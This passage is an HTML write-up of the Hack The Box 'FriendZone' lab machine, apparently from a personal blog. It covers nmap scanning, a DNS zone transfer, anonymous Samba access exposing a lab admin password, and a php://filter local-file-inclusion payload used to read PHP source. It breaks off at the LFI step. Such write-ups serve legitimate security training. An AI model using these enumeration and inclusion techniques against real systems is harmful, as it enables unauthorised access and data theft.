@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox FriendZone</strong></h1>
+        <em>Released: 09 Feb 2019 / Pwned: May 21st 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        FriendZone has both CTF and real-life elements and it finds a pretty good balance between the two. The vulns throughout the box are faily common ones but they require a little tweaking and thinking in order to get working.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • nmap scan using default scripts, <code>-sC</code>, to get some valuable information<br>
+        • follow all the rabbit holes<br>
+        • edit /etc/hosts in order to access parts of the site<br>
+        • perform a dns zone transfer in order to find some hidden domain names<br>
+        • find some credntials in samba<br>
+        • log in as an administrator<br>
+        • base64 encode using php://filter in order to find LFI<br>
+        • upload shell, execute LFI and get a shell on the system<br>
+        • find some world-writable files<br>
+        • run pspy to find a speedy script<br>
+        • modify what that script imports in order to code execution as root<br>
+        • modify /etc/shadow to get root<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Nmap acted a little funny for me on this box, so my scans looked a little different than usual.<br>
+        <br>
+        Initial scan:<br>
+        <code>nmap -sV 10.10.10.123</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;nmap&nbsp;-sV&nbsp;-sC&nbsp;10.10.10.123<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-05-20&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">friendzone</span>.red&nbsp;(10.10.10.123)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.044s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;993&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                21/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsftpd&nbsp;3.0.3<br>
+                22/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.6p1&nbsp;Ubuntu&nbsp;4&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b&nbsp;(ED25519)<br>
+                53/tcp&nbsp;&nbsp;open&nbsp;&nbsp;domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ISC&nbsp;BIND&nbsp;9.11.3-1ubuntu1.2&nbsp;(Ubuntu&nbsp;Linux)<br>
+                |&nbsp;dns-nsid:&nbsp;<br>
+                |_&nbsp;&nbsp;bind.version:&nbsp;9.11.3-1ubuntu1.2-Ubuntu<br>
+                80/tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.29&nbsp;((Ubuntu))<br>
+                |_http-server-header:&nbsp;Apache/2.4.29&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;Friend&nbsp;Zone&nbsp;Escape&nbsp;software<br>
+                139/tcp&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;Samba&nbsp;smbd&nbsp;3.X&nbsp;-&nbsp;4.X&nbsp;(workgroup:&nbsp;WORKGROUP)<br>
+                443/tcp&nbsp;open&nbsp;&nbsp;ssl/http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.29<br>
+                |_http-server-header:&nbsp;Apache/2.4.29&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;FriendZone&nbsp;escape&nbsp;software<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2018-10-05T21:02:30<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2018-11-04T21:02:30<br>
+                |_ssl-date:&nbsp;TLS&nbsp;randomness&nbsp;does&nbsp;not&nbsp;represent&nbsp;time<br>
+                |&nbsp;tls-alpn:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;http/1.1<br>
+                445/tcp&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;Samba&nbsp;smbd&nbsp;4.7.6-Ubuntu&nbsp;(workgroup:&nbsp;WORKGROUP)<br>
+                Service&nbsp;Info:&nbsp;Hosts:&nbsp;FRIENDZONE,&nbsp;127.0.0.1;&nbsp;OSs:&nbsp;Unix,&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+                <br>
+                Host&nbsp;script&nbsp;results:<br>
+                |_clock-skew:&nbsp;mean:&nbsp;-1h00m00s,&nbsp;deviation:&nbsp;1h43m54s,&nbsp;median:&nbsp;-1s<br>
+                |_nbstat:&nbsp;NetBIOS&nbsp;name:&nbsp;FRIENDZONE,&nbsp;NetBIOS&nbsp;user:&nbsp;&lt;unknown&gt;,&nbsp;NetBIOS&nbsp;MAC:&nbsp;&lt;unknown&gt;&nbsp;(unknown)<br>
+                |&nbsp;smb-os-discovery:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;OS:&nbsp;Windows&nbsp;6.1&nbsp;(Samba&nbsp;4.7.6-Ubuntu)<br>
+                |&nbsp;&nbsp;&nbsp;Computer&nbsp;name:&nbsp;friendzone<br>
+                |&nbsp;&nbsp;&nbsp;NetBIOS&nbsp;computer&nbsp;name:&nbsp;FRIENDZONE\x00<br>
+                |&nbsp;&nbsp;&nbsp;Domain&nbsp;name:&nbsp;\x00<br>
+                |&nbsp;&nbsp;&nbsp;FQDN:&nbsp;friendzone<br>
+                |_&nbsp;&nbsp;System&nbsp;time:&nbsp;2019-05-20T13:44:36+03:00<br>
+                |&nbsp;smb-security-mode:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;account_used:&nbsp;guest<br>
+                |&nbsp;&nbsp;&nbsp;authentication_level:&nbsp;user<br>
+                |&nbsp;&nbsp;&nbsp;challenge_response:&nbsp;supported<br>
+                |_&nbsp;&nbsp;message_signing:&nbsp;disabled&nbsp;(dangerous,&nbsp;but&nbsp;default)<br>
+                |&nbsp;smb2-security-mode:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2.02:&nbsp;<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;Message&nbsp;signing&nbsp;enabled&nbsp;but&nbsp;not&nbsp;required<br>
+                |&nbsp;smb2-time:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;date:&nbsp;2019-05-20&nbsp;11:44:37<br>
+                |_&nbsp;&nbsp;start_date:&nbsp;N/A<br>
+                <br>
+                Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;58.14&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        <code>22/ssh</code> is good to take note of.<br>
+        <code>53/dns</code>, <code>80/http</code>, <code>139/samba</code> and <code>443/https</code> are all useful to us.<br>
+        <br>
+        The title of the box - friend<code>zone</code>, combined with port 53 being open is a big hint for this box.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) Web</strong></h2><br>
+        Visit the site first - <code>http://10.10.10.123</code><br>
+        <br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        This is another hint.<br>
+        <code>friendzoneportal.red</code> is a rabbit hole, instead you should be looking at your nmap results and see that port 443 gives <code>friendzone.red</code> as the commonName on the SSL cert.<br>
+        <br>
+        Edit your hosts file so that the IP of the box, 10.10.10.123, points to <code>friendzone.red</code>.<br>
+        <br>
+        NOTE: be careful with this.<br>
+        friendzone.red also points to a legitimate site, so if you're running scans make sure you specify the IP and not the hostname so you don't go scanning real websites.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>hosts<br>
+                ...<br>
+                10.10.10.123&nbsp;friendzone.red<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Visit <code>https://friendzone.red</code> and we'll see that we're “ready to escape from friend zone�.<br>
+        <br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        This page is also a rabbit hole.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) DNS Zone transfer</strong></h2><br>
+        At this point, the word ‘zone’ should be at the forefront of your mind. Have a look at the DNS server running on port 53.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;dig&nbsp;@10.10.10.123&nbsp;friendzone.red<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&lt;&lt;&gt;&gt;&nbsp;DiG&nbsp;9.11.5-P4-5-Debian&nbsp;&lt;&lt;&gt;&gt;&nbsp;@10.10.10.123&nbsp;friendzone.red<br>
+                <span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>1&nbsp;server&nbsp;found<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;global&nbsp;options<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;+cmd<br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;Got&nbsp;answer<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;-&gt;&gt;HEADER&lt;&lt;-&nbsp;opcode<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;QUERY,&nbsp;status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;NOERROR,&nbsp;<span style="color:#ff9d00;font-weight:700">id:</span>&nbsp;22016<br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;flags<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;qr&nbsp;aa&nbsp;rd<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;QUERY<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1,&nbsp;ANSWER<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1,&nbsp;AUTHORITY<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1,&nbsp;ADDITIONAL<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;3<br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;WARNING<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;recursion&nbsp;requested&nbsp;but&nbsp;not&nbsp;available<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;OPT&nbsp;PSEUDOSECTION<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <span style="color:#ff9d00;font-weight:700">;</span>&nbsp;EDNS<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0,&nbsp;flags<span style="color:#ff9d00;font-weight:700">:;</span>&nbsp;udp<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;4096<br>
+                <span style="color:#ff9d00;font-weight:700">;</span>&nbsp;COOKIE<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;7cfbf720f58bf359daf7bf6c5ce28f3b23114c177f4c17dd&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>good<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;QUESTION&nbsp;SECTION<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <span style="color:#ff9d00;font-weight:700">;</span>friendzone.red. IN A<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;ANSWER&nbsp;SECTION<span style="color:#ff9d00;font-weight:700">:</span><br>
+                friendzone.red. 604800 IN A 127.0.0.1<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;AUTHORITY&nbsp;SECTION<span style="color:#ff9d00;font-weight:700">:</span><br>
+                friendzone.red. 604800 IN NS localhost.<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;ADDITIONAL&nbsp;SECTION<span style="color:#ff9d00;font-weight:700">:</span><br>
+                localhost. 604800 IN A 127.0.0.1<br>
+                localhost. 604800 IN AAAA <span style="color:#ff9d00;font-weight:700">::</span>1<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;Query&nbsp;time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;44&nbsp;msec<br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;SERVER<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10.10.10.123#53<span style="color:#ff9d00;font-weight:700">(</span>10.10.10.123<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;WHEN<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Mon&nbsp;May&nbsp;20&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>27<span style="color:#ff9d00;font-weight:700">:</span>56&nbsp;BST&nbsp;2019<br>
+                <span style="color:#ff9d00;font-weight:700">;;</span>&nbsp;MSG&nbsp;SIZE&nbsp;&nbsp;rcvd<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;154
+            </div>
+        </div><br>
+        <br>
+        'zone' is mentioned a lot. Try a DNS zone transfer:<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;host&nbsp;-l&nbsp;friendzone.red&nbsp;10.10.10.123<br>
+                Using&nbsp;domain&nbsp;server<span style="color:#ff9d00;font-weight:700">:</span><br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10.10.10.123<br>
+                Address<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10.10.10.123#53<br>
+                Aliases<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <br>
+                friendzone.red&nbsp;has&nbsp;IPv6&nbsp;address&nbsp;<span style="color:#ff9d00;font-weight:700">::</span>1<br>
+                friendzone.red&nbsp;name&nbsp;server&nbsp;localhost.<br>
+                friendzone.red&nbsp;has&nbsp;address&nbsp;127.0.0.1<br>
+                administrator1.friendzone.red&nbsp;has&nbsp;address&nbsp;127.0.0.1<br>
+                hr.friendzone.red&nbsp;has&nbsp;address&nbsp;127.0.0.1<br>
+                uploads.friendzone.red&nbsp;has&nbsp;address&nbsp;127.0.0.1
+            </div>
+        </div><br>
+        <br>
+        Nice :) We found some subdomains.<br>
+        Edit your hosts so you can access them.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>hosts<br>
+                ...<br>
+                10.10.10.123&nbsp;friendzone.red<br>
+                10.10.10.123&nbsp;administrator1.friendzone.red<br>
+                10.10.10.123&nbsp;hr.friendzone.red<br>
+                10.10.10.123&nbsp;uploads.friendzone.red<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) administrator1.friendzone.red</strong></h2><br>
+        uploads.friendzone.red is a rabbit hole (one that caused me a lot of bother).<br>
+        hr.friendzone.red wouldn't load for me, so administrator1.friendzone.red is where we should page.<br>
+        <br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Alas, a login page.<br>
+        At this point you need to go back to enumeration and have a look at the ports you haven't checked yet.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) 139/samba</strong></h2><br>
+        Connect to the samba share with no password.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;smbclient&nbsp;-L&nbsp;10.10.10.123<br>
+                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\r</span>oots&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <br>
+                Sharename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comment<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                print$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Printer&nbsp;Drivers<br>
+                Files&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FriendZone&nbsp;Samba&nbsp;Server&nbsp;Files&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>Files<br>
+                general&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FriendZone&nbsp;Samba&nbsp;Server&nbsp;Files<br>
+                Development&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FriendZone&nbsp;Samba&nbsp;Server&nbsp;Files<br>
+                IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC&nbsp;Service&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>FriendZone&nbsp;server&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Samba,&nbsp;Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                Reconnecting&nbsp;with&nbsp;SMB1&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">workgroup</span>&nbsp;listing.<br>
+                <br>
+                Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comment<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                <br>
+                Workgroup&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                WORKGROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FRIENDZONE
+            </div>
+        </div><br>
+        <br>
+        Have a look at the shares, the interesting information is in general.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;smbclient&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>10.10.10.123<span style="color:#ff9d00;font-weight:700">/</span>general<br>
+                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\r</span>oots&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                Try&nbsp;<span style="color:#3ad900;font-weight:400">"help"</span>&nbsp;to&nbsp;get&nbsp;a&nbsp;list&nbsp;of&nbsp;possible&nbsp;commands.<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Wed&nbsp;Jan&nbsp;16&nbsp;20<span style="color:#ff9d00;font-weight:700">:</span>10<span style="color:#ff9d00;font-weight:700">:</span>51&nbsp;2019<br>
+                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Wed&nbsp;Jan&nbsp;23&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>51<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;2019<br>
+                &nbsp;&nbsp;creds.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;57&nbsp;&nbsp;Wed&nbsp;Oct&nbsp;10&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>52<span style="color:#ff9d00;font-weight:700">:</span>42&nbsp;2018<br>
+                <br>
+                9221460&nbsp;blocks&nbsp;of&nbsp;size&nbsp;1024.&nbsp;6447304&nbsp;blocks&nbsp;available<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;get&nbsp;creds.txt<br>
+                getting&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#333333;font-weight:400">\c</span>reds.txt&nbsp;of&nbsp;size&nbsp;57&nbsp;as&nbsp;creds.txt&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.3&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>average&nbsp;0.3&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;quit<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;creds.txt<br>
+                creds&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">the</span>&nbsp;admin&nbsp;THING:<br>
+                <br>
+                admin:WORKWORKHhallelujah@#
+            </div>
+        </div><br>
+        <br>
+        Credentials!<br>
+        “admin THING� is presumably administrator1.friendzone.red. Go log in.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) LFI</strong></h2><br>
+        We arrive at <code>administrator1.friendzone.red/dashboard.php</code><br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        Use the parameters the page provides to “show the image�.<br>
+        <code>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp</code><br>
+        <br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        The timestamp that's being printed at the bottom of the page is unix epoch time, which made me think there might be some system commands going on within that parameter. That's not the case, but that was my thought process.<br>
+        <br>
+        After being all aboard the struggle bus for a while, I considered that maybe <code>timestamp</code> in the pagename parameter was a php file. I tried base64-encoding it in the hope that i might be able to read its contents...<br>
+        <br>
+        <code>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/convert.base64-encode/resource=timestamp</code><br>
+        <br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        And we can!<br>
+        By base64 encoding php files using the php://filter function, you can prevent the php file from executing and be able to read it.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone<span style="color:#ff9d00;font-weight:700">/</span>443http#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo="</span>&nbsp;&gt;&nbsp;timestamp.php.b64<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone<span style="color:#ff9d00;font-weight:700">/</span>443http#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;timestamp.php.b64&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d&nbsp;&gt;&nbsp;timestamp.php<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>friendzone<span style="color:#ff9d00;font-weight:700">/</span>443http#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;timestamp.php<br>
+                &lt;?php<br>
+                <br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">$time_final</span>&nbsp;=&nbsp;<span style="color:#ffdd00;font-weight:400">time()</span>&nbsp;+&nbsp;3600<span style="color:#ff9d00;font-weight:700">;</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Final&nbsp;Access&nbsp;timestamp&nbsp;is&nbsp;$time_final"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <br>
+                <br>
+                ?&gt;
+            </div>
